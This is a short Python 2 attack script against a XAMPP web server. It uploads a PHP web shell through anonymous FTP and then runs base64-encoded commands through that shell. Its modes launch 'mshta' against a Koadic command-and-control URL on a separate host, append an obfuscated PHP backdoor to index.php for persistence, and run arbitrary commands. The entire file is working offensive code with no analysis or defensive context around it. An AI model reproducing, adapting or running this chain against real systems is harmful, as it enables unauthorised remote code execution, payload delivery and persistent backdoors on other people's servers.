#!/usr/bin/python
import argparse, ftplib, requests, sys, urllib

target = "10.5.9.2"
path = "/xampp/htdocs"
koadic_url = "http://10.5.9.9:9999/nsrl"
koadic_cmd = "mshta " + koadic_url
persist_cmd = "echo ^<?php @extract ($_REQUEST); @die ($ctime($c($atime))); ?^> >> index.php"

mode = "cmd"
cmd = ""

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-m', dest='mode', help='mode')
    parser.add_argument('-c', dest='cmd', help='cmd to run')
    args = parser.parse_args()

    if not args.mode:
        print "duh"
        sys.exit(0)

    if args.mode == "pwn":
        ftp = ftplib.FTP(target, 'anonymous', 'blarknob')
        f = open('tiny.php','rb')
        ftp.set_pasv(False)
        ftp.cwd(path)
        ftp.storbinary('STOR s.php', f)
        f.close()
        ftp.quit()
    elif args.mode == "koadic":
        r = requests.get('http://' + target + '/s.php?ctime=system&c=base64_decode&atime=' + urllib.quote_plus(koadic_cmd.encode('base64')))
    elif args.mode == "persist":
        r = requests.get('http://' + target + '/s.php?ctime=system&c=base64_decode&atime=' + urllib.quote_plus(persist_cmd.encode('base64')))
    elif args.mode == "cmd":
        r = requests.get('http://' + target + '/s.php?ctime=system&c=base64_decode&atime=' + urllib.quote_plus(args.cmd.encode('base64')))
        print r.text

if __name__ == "__main__":
    main()
